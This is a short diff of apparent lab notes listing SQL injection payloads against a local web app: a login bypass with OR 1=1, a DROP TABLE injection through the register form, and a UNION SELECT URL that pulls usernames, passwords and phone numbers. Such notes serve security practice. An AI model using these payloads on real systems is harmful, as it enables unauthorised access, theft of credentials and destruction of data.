@@ -4,7 +4,7 @@
 " OR 1=1; --
 on login form, will cause us to login as first user
 
-" ; DROP TABLE secrets; --
+"", "", "", "", "") ; DROP TABLE secrets; --
 setup the secrets table first, this will drop the table. Do this on register since it runs executescript
 
 http://127.0.0.1:5000/?namelike=%22%20union%20select%20username,password,phone%20from%20users;%20--
